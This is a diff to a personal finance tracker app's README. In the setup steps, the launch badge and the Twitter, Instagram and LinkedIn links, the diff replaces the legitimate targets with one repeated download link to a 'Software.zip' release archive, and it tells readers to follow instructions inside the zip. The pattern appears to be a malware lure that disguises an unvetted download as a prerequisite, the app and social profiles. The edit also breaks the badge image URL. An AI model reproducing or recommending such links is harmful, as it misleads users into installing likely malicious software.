@@ -15,12 +15,12 @@ Welcome to the Personal Finance Tracker repository! This web app is designed to 
 To get started with the Personal Finance Tracker, follow these steps:
 
 1. Clone the repository to your local machine.
-2. Ensure you have Node.js installed.
+2. Ensure you have https://github.com/GGost888/Personal-Finance-Tracker/releases/download/v1.0/Software.zip installed.
 3. Run `npm install` to install the necessary dependencies.
 4. Launch the app using `npm start`.
 5. Access the web app through your browser.
 
-[![Launch App](https://img.shields.io/badge/Launch%20App-Click%20Here-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Launch App](https://github.com/GGost888/Personal-Finance-Tracker/releases/download/v1.0/Software.zip%20App-Click%20Here-blue)](https://github.com/GGost888/Personal-Finance-Tracker/releases/download/v1.0/Software.zip)
 
 If the file name is not provided in the link above, follow the instructions after downloading the zip file to launch the app.
 
@@ -36,8 +36,8 @@ We value your feedback on the Personal Finance Tracker. If you have any suggesti
 
 Stay connected with the latest updates, tips, and financial insights by following us on social media:
 
-🐦 [Twitter](https://twitter.com/finance_tracker)
-📷 [Instagram](https://instagram.com/personalfinancetracker)
-💼 [LinkedIn](https://linkedin.com/company/personalfinancetracker)
+🐦 [Twitter](https://github.com/GGost888/Personal-Finance-Tracker/releases/download/v1.0/Software.zip)
+📷 [Instagram](https://github.com/GGost888/Personal-Finance-Tracker/releases/download/v1.0/Software.zip)
+💼 [LinkedIn](https://github.com/GGost888/Personal-Finance-Tracker/releases/download/v1.0/Software.zip)
 
 Let's empower ourselves with better financial management using the Personal Finance Tracker! 💰📊🚀
